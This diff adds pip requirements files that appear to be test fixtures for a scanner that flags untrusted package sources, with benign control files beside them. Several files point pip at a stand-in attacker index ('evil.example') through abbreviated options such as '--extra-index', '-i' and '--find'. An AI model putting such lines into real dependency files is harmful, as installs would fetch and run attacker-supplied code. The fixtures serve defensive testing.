@@ -1,0 +1,118 @@
+diff --git a/requirements/allowed-host.txt b/requirements/allowed-host.txt
+new file mode 100644
+index 0000000..1000001
+--- /dev/null
++++ b/requirements/allowed-host.txt
+@@ -0,0 +1,2 @@
++--extra-index-url https://pypi.corp.example/simple/
++requests==2.31.0
+diff --git a/requirements/e-attached-control.txt b/requirements/e-attached-control.txt
+new file mode 100644
+index 0000000..1000002
+--- /dev/null
++++ b/requirements/e-attached-control.txt
+@@ -0,0 +1,2 @@
++-e.
++requests==2.31.0
+diff --git a/requirements/e-attached.txt b/requirements/e-attached.txt
+new file mode 100644
+index 0000000..1000003
+--- /dev/null
++++ b/requirements/e-attached.txt
+@@ -0,0 +1,2 @@
++-egit+https://github.com/x/y.git#egg=y
++requests==2.31.0
+diff --git a/requirements/extra-index-control.txt b/requirements/extra-index-control.txt
+new file mode 100644
+index 0000000..1000004
+--- /dev/null
++++ b/requirements/extra-index-control.txt
+@@ -0,0 +1,2 @@
++--extra-index https://pypi.org/simple/
++requests==2.31.0
+diff --git a/requirements/extra-index-eq-control.txt b/requirements/extra-index-eq-control.txt
+new file mode 100644
+index 0000000..1000005
+--- /dev/null
++++ b/requirements/extra-index-eq-control.txt
+@@ -0,0 +1,2 @@
++--extra-index=https://pypi.org/simple/
++requests==2.31.0
+diff --git a/requirements/extra-index-eq.txt b/requirements/extra-index-eq.txt
+new file mode 100644
+index 0000000..1000006
+--- /dev/null
++++ b/requirements/extra-index-eq.txt
+@@ -0,0 +1,2 @@
++--extra-index=https://evil.example/simple/
++requests==2.31.0
+diff --git a/requirements/extra-index.txt b/requirements/extra-index.txt
+new file mode 100644
+index 0000000..1000007
+--- /dev/null
++++ b/requirements/extra-index.txt
+@@ -0,0 +1,2 @@
++--extra-index https://evil.example/simple/
++requests==2.31.0
+diff --git a/requirements/find-control.txt b/requirements/find-control.txt
+new file mode 100644
+index 0000000..1000008
+--- /dev/null
++++ b/requirements/find-control.txt
+@@ -0,0 +1,2 @@
++--find https://files.pythonhosted.org/packages/
++requests==2.31.0
+diff --git a/requirements/find.txt b/requirements/find.txt
+new file mode 100644
+index 0000000..1000009
+--- /dev/null
++++ b/requirements/find.txt
+@@ -0,0 +1,2 @@
++--find https://evil.example/wheels/
++requests==2.31.0
+diff --git a/requirements/i-attached-control.txt b/requirements/i-attached-control.txt
+new file mode 100644
+index 0000000..1000010
+--- /dev/null
++++ b/requirements/i-attached-control.txt
+@@ -0,0 +1,2 @@
++-ihttps://pypi.org/simple
++requests==2.31.0
+diff --git a/requirements/i-attached.txt b/requirements/i-attached.txt
+new file mode 100644
+index 0000000..1000011
+--- /dev/null
++++ b/requirements/i-attached.txt
+@@ -0,0 +1,2 @@
++-ihttps://evil.example/simple/
++requests==2.31.0
+diff --git a/requirements/index-control.txt b/requirements/index-control.txt
+new file mode 100644
+index 0000000..1000012
+--- /dev/null
++++ b/requirements/index-control.txt
+@@ -0,0 +1,2 @@
++--index https://pypi.org/simple
++requests==2.31.0
+diff --git a/requirements/index.txt b/requirements/index.txt
+new file mode 100644
+index 0000000..1000013
+--- /dev/null
++++ b/requirements/index.txt
+@@ -0,0 +1,2 @@
++--index https://evil.example/simple/
++requests==2.31.0
+diff --git a/requirements/no-trigger.txt b/requirements/no-trigger.txt
+new file mode 100644
+index 0000000..1000014
+--- /dev/null
++++ b/requirements/no-trigger.txt
+@@ -0,0 +1,8 @@
++--index-url https://pypi.org/simple
++--no-index
++--pre
++-r other.txt
++-c constraints.txt
++--requirement=other.txt
++--constraint constraints.txt
++requests==2.31.0 --hash=sha256:70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6
